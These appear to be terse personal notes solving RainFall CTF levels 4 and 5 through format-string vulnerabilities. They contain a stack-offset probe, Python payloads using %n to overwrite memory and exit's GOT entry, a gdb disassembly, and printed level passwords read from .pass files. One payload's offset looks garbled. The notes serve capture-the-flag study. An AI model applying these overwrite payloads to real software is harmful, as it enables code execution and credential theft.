```
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
```

local_20c have a size of 520 but fgets let us only read 0x200 (512) char

level4@RainFall:~$ ./level4 
AAAAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x 
AAAAAA b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 41414141 25204141 78252078 20782520 25207825 78252078 20782520

A is in 12nd argument


python -c 'print "\x10\x98\x04\x08" + "%16930112c" + "%134513824$n"' > input.txt

0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a



*------------------
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370

python -c 'print "\x08\x04\x98\x38"[::-1] + "%134513824c" + "%4$n"' > input.txt

                                                                          
  whoami
level6
pwd
/home/user/level5
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31